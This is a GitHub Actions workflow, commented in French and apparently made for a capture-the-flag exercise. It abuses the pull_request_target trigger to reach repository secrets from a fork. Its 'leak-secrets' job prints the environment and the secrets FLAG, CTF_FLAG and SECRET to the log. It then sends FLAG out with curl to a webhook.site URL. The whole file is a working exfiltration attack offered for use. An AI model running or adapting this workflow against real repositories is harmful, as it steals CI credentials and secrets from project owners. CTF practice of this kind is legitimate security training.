name: Exploit Workflow

on:
  pull_request_target:  # Important : accède aux secrets même depuis un fork
  workflow_dispatch:     # Permet de déclencher manuellement

jobs:
  leak-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Show all environment variables
        run: env | sort
      
      - name: Try to leak FLAG
        run: |
          echo "FLAG: ${{ secrets.FLAG }}"
          echo "CTF_FLAG: ${{ secrets.CTF_FLAG }}"
          echo "SECRET: ${{ secrets.SECRET }}"
      
      - name: Exfiltrate via webhook (optionnel)
        run: |
          curl -X POST https://webhook.site/VOTRE-ID \
            -H "Content-Type: application/json" \
            -d "{\"flag\":\"${{ secrets.FLAG }}\"}"
